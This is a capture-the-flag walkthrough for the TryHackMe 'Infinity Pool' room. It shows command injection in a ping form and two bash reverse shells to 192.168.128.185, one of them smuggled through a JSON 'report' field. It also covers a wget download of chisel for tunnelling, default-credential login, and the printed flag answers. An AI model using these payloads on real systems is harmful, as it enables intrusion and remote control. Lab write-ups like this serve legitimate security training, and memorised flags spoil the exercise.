![Infinity Pool Banner](https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251849136)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Cover.png" alt="Infinity Pool Logo">
</p>

# <img src="https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251854806" alt="image" style="vertical-align: middle;height: 50px;" /> Infinity Pool

This guide contains the answer and steps necessary to get to them for the [Infinity Pool](https://tryhackme.com/room/hh-infinitypool-5b3548af) room.

<h2>Table of contents</h2>

- [Task 2 - Hacker Holidays: Day 11](#task-2---hacker-holidays-day-11)

### Task 2 - Hacker Holidays: Day 11

1.  What is the user flag?

    Our `nmap` and `gobuster` command found a webserver on port 80 and some entries in the robots file. It also found two endpoints that we can reach. But only `status` is reachable from the browser.

    ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Nmap.png)
    
    ![Gobuster](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Gobuster.png)

    On the status page, we can enter an ip address and it will send a ping request. The page is also directed to 'internal/netcheck'.

    ![Status](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Status.png)

    On the main page we can find the script that contains remarks about this 'status' page.

    ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Script.png)

    It seems to post to a 'netcheck' handler without authentication. Viewing the source page of the 'status' page also confirms it POSTS to this endpoint.

    ![Post](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Post.png)

    Perhaps we can use a command injection method to get RCE on the server. Looking at the request and what is returned we can assume the server is running the following command:

    ```console
    ping -c 1 <host>
    ```

    Lets add the `id` command to run after the `ping` command

    ```console
    ping -c 1 <host> && id
    ```

    ![Rce](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Rce.png)

    Looks like we have RCE! Perhaps we can even find the user flag this way.

    We managed to find an intersting file in the user folder.

    ![User Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_User_Flag.png)

    ><details><summary>Click for answer</summary>THM{n0_v1s1bl3_3dg3}</details>

2.  What is the root flag?

    To make things a bit easier. Lets establish a connection back to our machine.

    ```console
    192.168.128.185 && bash -c 'bash -i >& /dev/tcp/192.168.128.185/1337 0>&1'
    ```
    
    Looking through various item didn't lead to anything interesting.

    - Cronjobs
    - Services
    - Processes
    - SUID

    However, looking at open connection did turn up something.

    ```console
    ss -tulpn
    ```

    ![Connections](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Connections.png)

    Looks like there are several services listening on local ports only accessible from the localhost. We can enumerate them to see what they are.

    ```console
    for p in 53 9000 5038 3000 8080 8089 8088 3306; do echo "===" $p "==="; curl -s localhost:$p | head -c 200; echo ; done
    ```

    ![Listeners](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Listeners.png)

    Two notable results are the services on port 8080 and 3000. 8080 seems to host some sort of webpage and 3000 hosts some sort of console. We should start with that.

    We can use curl again to investigate the endpoints.

    ```console
    curl localhost:3000/api/health
    curl localhost:3000/api/config
    ```

    ![Api Endpoints](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Api_Endpoints.png)

    The config endpoint lists some usefull information. Looks like credentials for the console on port 8080. Unfortunately, we cannot login or view the page properly using our reverse shell. We need to create a tunnel so we can directly interact with the services from our machine.

    First we install `chisel` if not available. Then we make a copy of the binary to send it to the target. And setup a chisel server on port 8888.

    ```console
    mkdir chisel && cp /usr/bin/chisel chisel && chmod +x chisel
    python3 -m http.server 8080
    chisel server -p 8888 --reverse
    ```

    Now on the target, we download the binary and make it executable.

    ```console
    cd /tmp && wget 192.168.128.185:8081/chisel/chisel -O chisel
    chmod +x chisel
    ./chisel client 192.168.128.185:8888 R:8282:127.0.0.1:3000 R:8181:127.0.0.1:8080
    ```

    This creates a tunnel that forwards two of our ports (8282 and 8181) to the services on the target port 3000 and 8080.

    ![Tunnel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Tunnel.png)

    ![Tunnel Check](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Tunnel_Check.png)

    The tunnel is working. Now lets go to the console we saw on port '8080'.

    From the api/config endpoint, we found the portal url to be: '127.0.0.1:8080/ucp'. So we need to include this in our browser, but using the forwarded port instead (8181)

    ```
    http://127.0.0.1:8181/ucp/
    ```

    ![Ucp Portal](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Ucp_Portal.png)

    The endpoint also mentioned the default template credentials are still used. Lets try the ones provide by the config endpoint.

    ![Ucp Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Ucp_Login.png)

    Success, we are in!

    After looking around, lets create a dashboard, add some widgets, and see what we can find.

    ![Dashboard](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Dashboard.png)

    Most of the widgets didn't give us anything usefull. However, the voicemail widget seems to carry a key token for the automation. From the config api endpoint we found an automation endpoint on port 9000. Is didn't add this to our tunnel. So I need to re-establish the tunnel to include this port.

    ```console
    ./chisel client 192.168.128.185:8888 R:8282:127.0.0.1:3000 R:8181:127.0.0.1:8080 R:8383:127.0.0.1:9000
    ```

    We will try to connect to the automation endpoint with this token. First set up a listener. I tried a recursive dir scan to find the endpoint, but it didn't work. So I found a working endpoint "jobs/export".

    ```console
    curl -s http://127.0.0.1:8383/jobs/export -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" -H "Content-Type:application/json" -d "id"
    ```

    ![Test](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Test.png)

    We add the token and content type. From the data we send, we see we need to add a field called repport.

    Now we need to make sure to type it correct. We need it to correctly be parsed by the json parser. Meaning double quotes need to be escaped with '\"'.

    ```console
    curl -s http://127.0.0.1:8383/jobs/export -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" -H "Content-Type:application/json" -d '{"report":"x; bash -c \"bash -i >& /dev/tcp/192.168.128.185/1338 0>&1\" #"}'
    ```

    ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-infinitypool-5b3548af/Infinity_Pool_Root_Flag.png)

    ><details><summary>Click for answer</summary>THM{tr4c3d_t0_th3_h0r1z0n}</details>
